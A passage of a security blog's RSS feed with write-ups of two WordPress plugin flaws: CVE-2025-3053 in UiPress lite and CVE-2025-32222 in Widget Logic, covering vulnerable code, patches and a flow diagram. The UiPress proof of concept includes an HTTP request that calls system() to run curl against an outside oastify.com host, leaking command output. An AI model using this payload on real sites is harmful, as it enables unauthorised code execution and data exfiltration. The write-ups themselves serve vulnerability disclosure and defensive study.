1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Log in as a &lt;strong&gt;Subscriber&lt;/strong&gt; user&lt;/li&gt;&#xA;&lt;li&gt;Obtain the security value from the response&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-01-cve-2025-3053/security.png&#34; title=&#34;Security value&#34; data-thumbnail=&#34;/posts/2025-12-01-cve-2025-3053/security.png&#34; data-sub-html=&#34;&lt;h2&gt;Security value&lt;/h2&gt;&lt;p&gt;Security value&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-01-cve-2025-3053/security.png&#39; alt=&#34;Security value&#34; height=&#34;637&#34; width=&#34;1485&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Security value&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Send a request containing the payload:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;action=uip_process_form_input&amp;amp;security=65c1a4e801&amp;amp;formData=&amp;#34;curl&amp;#43;http://1aclwhon6rw1l1bj569pxpkjqaw1ks8h.oastify.com?leadked=$(whoami)&amp;#34;&amp;amp;userFunction=system&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-01-cve-2025-3053/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-01-cve-2025-3053/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-01-cve-2025-3053/result.png&#39; alt=&#34;Result&#34; height=&#34;579&#34; width=&#34;1049&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-3053&lt;/strong&gt; vulnerability stems from &lt;code&gt;uip_process_form_input()&lt;/code&gt; allowing users to directly control the &lt;strong&gt;function name to be executed&lt;/strong&gt; via &lt;code&gt;userFunction&lt;/code&gt;, while only checking &lt;code&gt;function_exists()&lt;/code&gt; and &lt;strong&gt;not performing any capability checks or using a whitelist&lt;/strong&gt;. This allows low-privileged authenticated users (Subscriber) to perform &lt;strong&gt;Arbitrary Function Calls&lt;/strong&gt;, leading to &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;. Version &lt;strong&gt;3.5.08&lt;/strong&gt; mitigates the issue by completely disabling this mechanism.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Do not allow users to control &lt;strong&gt;dynamic function calls&lt;/strong&gt; without a strict whitelist.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;nonce&lt;/code&gt; / &lt;code&gt;check_ajax_referer()&lt;/code&gt; &lt;strong&gt;do not replace&lt;/strong&gt; &lt;code&gt;current_user_can()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;function_exists()&lt;/code&gt; &lt;strong&gt;is not a security control&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Logic flaws are more dangerous than improper sanitization.&lt;/li&gt;&#xA;&lt;li&gt;Always apply the &lt;strong&gt;principle of least privilege&lt;/strong&gt; to AJAX endpoints.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/uipress-lite/vulnerability/wordpress-uipress-lite-plugin-3-5-07-authenticated-subscriber-remote-code-execution-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UiPress lite Plugin &amp;lt;= 3.5.07 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-32222 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-30-cve-2025-32222/</link>
      <pubDate>Sun, 30 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-30-cve-2025-32222/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-30-cve-2025-32222/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Improper Control of Generation of Code (&amp;lsquo;Code Injection&amp;rsquo;)&lt;/strong&gt; vulnerability in Widgetlogic.org’s &lt;strong&gt;Widget Logic (widget-logic)&lt;/strong&gt; allows &lt;strong&gt;Code Injection&lt;/strong&gt;. This issue affects Widget Logic from versions &lt;strong&gt;n/a to &amp;lt;= 6.0.5&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-32222&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-32222&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 6.0.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 6.0.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/widget-logic/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Widget Logic Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;Widget Logic&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;6.0.5&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;6.0.6&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v6.0.5):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function widget_logic_check_logic($logic)&#xA;{&#xA;    $logic = @trim((string) $logic);&#xA;    $logic = apply_filters(&amp;#34;widget_logic_eval_override&amp;#34;, $logic);&#xA;&#xA;    if (is_bool($logic)) {&#xA;        return $logic;&#xA;    }&#xA;&#xA;    if ($logic === &amp;#39;&amp;#39;) {&#xA;        return true;&#xA;    }&#xA;&#xA;    if (stristr($logic, &amp;#39;return&amp;#39;) === false) {&#xA;        $logic = &amp;#39;return (&amp;#39; . html_entity_decode($logic, ENT_COMPAT | ENT_HTML401 | ENT_QUOTES) . &amp;#39;);&amp;#39;;&#xA;    }&#xA;&#xA;    set_error_handler(&amp;#39;widget_logic_error_handler&amp;#39;); // phpcs:ignore -- we have mode for debugging for admins&#xA;&#xA;    try {&#xA;        $show_widget = eval ($logic); // @codingStandardsIgnoreLine - widget can&amp;#39;t work without eval&#xA;    } catch (Error $e) {&#xA;        trigger_error($e-&amp;gt;getMessage(), E_USER_WARNING); // @codingStandardsIgnoreLine - message is not dependent on user input&#xA;&#xA;        $show_widget = false;&#xA;    }&#xA;&#xA;    restore_error_handler();&#xA;&#xA;    return $show_widget;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;widget_logic_check_logic()&lt;/code&gt; function uses &lt;code&gt;eval()&lt;/code&gt; to directly execute the logic string provided by the user, without restricting which functions can be called. If the logic string does not contain the &lt;code&gt;return&lt;/code&gt; keyword, the function automatically wraps it into a &lt;code&gt;return(...)&lt;/code&gt; statement to ensure the expression is always valid when executed by &lt;code&gt;eval()&lt;/code&gt;. This mechanism allows users to enter simple conditional expressions, but it also turns every user input into complete PHP code, significantly increasing the risk of &lt;strong&gt;arbitrary code execution (RCE)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patch (v6.0.6):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function widget_logic_check_logic($logic)&#xA;{&#xA;    $allowed_functions = array(&#xA;        &amp;#39;is_home&amp;#39;, &amp;#39;is_front_page&amp;#39;, &amp;#39;is_single&amp;#39;, &amp;#39;is_page&amp;#39;, &amp;#39;is_category&amp;#39;,&#xA;        &amp;#39;is_tag&amp;#39;, &amp;#39;is_archive&amp;#39;, &amp;#39;is_search&amp;#39;, &amp;#39;is_404&amp;#39;, &amp;#39;is_user_logged_in&amp;#39;,&#xA;        &amp;#39;current_user_can&amp;#39;, &amp;#39;is_active_sidebar&amp;#39;, &amp;#39;is_admin&amp;#39;,&#xA;    );&#xA;&#xA;    $allowed_functions = apply_filters(&amp;#39;widget_logic_allowed_functions&amp;#39;, $allowed_functions);&#xA;&#xA;    $logic = trim((string) $logic);&#xA;    if (&amp;#39;&amp;#39; === $logic) {&#xA;        return true;&#xA;    }&#xA;&#xA;    // Set up error handling&#xA;    set_error_handler(&amp;#39;widget_logic_error_handler&amp;#39;, E_WARNING | E_USER_WARNING);  // @codingStandardsIgnoreLine - we need this for error handling&#xA;&#xA;    try {&#xA;        // Tokenize the logic string&#xA;        $tokens = widget_logic_tokenize($logic);&#xA;&#xA;        // Parse and evaluate the expression&#xA;        $pos = 0;&#xA;        $result = widget_logic_parse_expression($tokens, $pos, $allowed_functions);&#xA;&#xA;        // Check if there are any unexpected tokens after the expression&#xA;        if ($pos &amp;lt; count($tokens)) {&#xA;            throw new Exception(esc_html__(&amp;#39;Widget Logic: Unexpected tokens after expression.&amp;#39;, &amp;#39;widget-logic&amp;#39;));&#xA;        }&#xA;&#xA;        return (bool)$result;&#xA;    } catch (Exception $e) {&#xA;        widget_logic_error_handler(E_USER_WARNING, $e-&amp;gt;getMessage());&#xA;        return false;&#xA;    } finally {&#xA;        restore_error_handler();&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-30-cve-2025-32222/diff.png&#34; title=&#34;Changes introduced in the patch&#34; data-thumbnail=&#34;/posts/2025-11-30-cve-2025-32222/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Changes introduced in the patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-30-cve-2025-32222/diff.png&#39; alt=&#34;Diff&#34; height=&#34;876&#34; width=&#34;1899&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Changes introduced in the patch&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch removes &lt;code&gt;eval()&lt;/code&gt; and replaces it with a &lt;strong&gt;tokenizer and parser&lt;/strong&gt; to evaluate the logic, allowing only functions in a &lt;strong&gt;whitelist&lt;/strong&gt;. It validates the syntax, detects unexpected tokens, and handles errors with &lt;code&gt;try/catch/finally&lt;/code&gt;, thereby &lt;strong&gt;strengthening security&lt;/strong&gt; while still ensuring normal widget logic behavior.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a filter hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_filter(&amp;#39;render_block&amp;#39;, &amp;#39;widget_logic_block_render&amp;#39;, 10, 2);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;render_block&lt;/code&gt; is a WordPress filter hook that is called whenever a block (Gutenberg block) is rendered. This means that when a post/page is created, the plugin intercepts the block rendering process with the &lt;code&gt;widget_logic_block_render&lt;/code&gt; callback.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function widget_logic_block_render($block_content, $block)&#xA;{&#xA;    if (!isset($block[&amp;#39;attrs&amp;#39;][&amp;#39;widgetLogic&amp;#39;])) {&#xA;        return $block_content;&#xA;    }&#xA;&#xA;    return widget_logic_check_logic($block[&amp;#39;attrs&amp;#39;][&amp;#39;widgetLogic&amp;#39;]) ? $block_content : &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;widget_logic_block_render&lt;/code&gt; function checks if the block has the &lt;code&gt;widgetLogic&lt;/code&gt; attribute. If not, it is rendered normally. This attribute is added through the &lt;strong&gt;Advanced Option&lt;/strong&gt; when adding a block.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-30-cve-2025-32222/widget.png&#34; title=&#34;Widget Logic in Advanced Options&#34; data-thumbnail=&#34;/posts/2025-11-30-cve-2025-32222/widget.png&#34; data-sub-html=&#34;&lt;h2&gt;Widget&lt;/h2&gt;&lt;p&gt;Widget Logic in Advanced Options&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-30-cve-2025-32222/widget.png&#39; alt=&#34;Widget&#34; height=&#34;622&#34; width=&#34;347&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Widget Logic in Advanced Options&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;widget_logic_check_logic&lt;/code&gt; is called if the block contains this attribute.&lt;/p&gt;&#xA;&lt;p&gt;The vulnerability is disclosed with a required privilege of &lt;strong&gt;Contributor&lt;/strong&gt;, since this role can create posts and use Widget Logic in Advanced Options.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Contributor creates/edits a Gutenberg block&amp;#34;] --&amp;gt; B[&amp;#34;Add widgetLogic value in Advanced Options&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Page/Post is rendered&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;render_block filter is triggered&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;widget_logic_block_render() is called&amp;#34;]&#xA;&#xA;E --&amp;gt; F{&amp;#34;block[&amp;#39;attrs&amp;#39;][&amp;#39;widgetLogic&amp;#39;] exists?&amp;#34;}&#xA;F -- No --&amp;gt; G[&amp;#34;Render block normally&amp;#34;]&#xA;F -- Yes --&amp;gt; H[&amp;#34;Pass widgetLogic to widget_logic_check_logic()&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;Normalize &amp;amp; wrap logic with return(...) if needed&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Execute logic using eval()&amp;#34;]&#xA;&#xA;J --&amp;gt; K{&amp;#34;Result = true ?&amp;#34;}&#xA;K -- Yes --&amp;gt; L[&amp;#34;Block content is displayed&amp;#34;]&#xA;K -- No --&amp;gt; M[&amp;#34;Block is hidden (empty)&amp;#34;]&#xA;&#xA;J --&amp;gt; N{&amp;#34;Malicious code injected?&amp;#34;}&#xA;N -- Yes --&amp;gt; O[&amp;#34;Arbitrary PHP code executed (RCE)&amp;#34;]&#xA;&#xA;L --&amp;gt; Z[&amp;#34;End&amp;#34;]&#xA;M --&amp;gt; Z&#xA;O --&amp;gt; Z&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; 